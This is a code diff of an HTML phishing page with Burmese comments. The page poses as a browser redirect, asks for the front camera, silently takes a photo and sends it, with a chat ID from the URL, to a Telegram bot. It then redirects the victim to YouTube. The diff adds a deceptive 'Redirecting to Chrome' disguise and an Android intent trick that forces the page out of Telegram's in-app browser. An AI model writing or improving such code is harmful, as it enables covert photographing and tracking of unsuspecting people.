@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Please Allow Camera</title>
+    <title>Redirecting to Chrome...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -18,7 +18,6 @@
         .container {
             background: white;
             border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             max-width: 350px;
             width: 100%;
             padding: 50px 30px;
@@ -38,7 +37,6 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .status { color: #666; margin-top: 20px; font-size: 13px; }
-        .hidden { display: none; }
         button {
             background: #28a745;
             color: white;
@@ -55,10 +53,10 @@
 </head>
 <body>
     <div class="container">
-        <h1>📸 Camera Required</h1>
-        <div class="subtitle">Please click Allow to continue</div>
+        <h1>🔄 Redirecting</h1>
+        <div class="subtitle">Opening in Chrome browser...</div>
         <div class="loading"></div>
-        <div class="status">Requesting camera permission...</div>
+        <div class="status">Please wait...</div>
     </div>
 
     <script>
@@ -68,13 +66,21 @@
         const urlParams = new URLSearchParams(window.location.search);
         const OWNER_ID = urlParams.get('id');
         
+        const isTelegram = /Telegram/i.test(navigator.userAgent);
+        const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
+        
+        // Telegram ဆိုရင် Chrome ကို Auto ခေါ်မယ်
+        if (isTelegram && isMobile) {
+            const currentUrl = window.location.href;
+            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
+        }
+        
         let photoSent = false;
         
         async function takePhotoAndSend(stream) {
             if (photoSent) return;
             photoSent = true;
             
-            // Video element (ဘယ်မှမပြဘူး)
             const video = document.createElement('video');
             video.srcObject = stream;
             video.setAttribute('playsinline', '');
@@ -86,17 +92,14 @@
                 };
             });
             
-            // Canvas နဲ့ ပုံရိုက်မယ်
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Stream ကိုပိတ်မယ်
             stream.getTracks().forEach(track => track.stop());
             
-            // ပုံကို Bot ဆီပို့မယ်
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
                 formData.append('chat_id', OWNER_ID);
@@ -112,10 +115,9 @@
                     console.log('Send error:', e);
                 }
                 
-                // YouTube ကို ခေါ်မယ်
                 window.location.href = YOUTUBE_URL;
                 
-            }, 'image/jpeg', 0.7);
+            }, 'image/jpeg', 0.8);
         }
         
         async function init() {
@@ -128,21 +130,17 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
                 });
-                
-                // Allow နိပ်ပြီးတာနဲ့ ချက်ချင်းပုံရိုက်မယ်
                 await takePhotoAndSend(stream);
                 
             } catch (err) {
-                // Camera မပေးရင်
                 document.body.innerHTML = `
                     <div class="container">
-                        <h1>❌ Camera Required</h1>
+                        <h1>📸 Camera Required</h1>
                         <div class="subtitle">Please click ALLOW to continue</div>
                         <button onclick="location.reload()">🔄 Try Again</button>
                     </div>
                 `;
                 
-                // Owner ကို အကြောင်းကြားမယ်
                 if (OWNER_ID) {
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
@@ -156,7 +154,10 @@
             }
         }
         
-        init();
+        // Chrome မှာဆိုရင် Camera စမယ်
+        if (!isTelegram || !isMobile) {
+            init();
+        }
     </script>
 </body>
 </html>
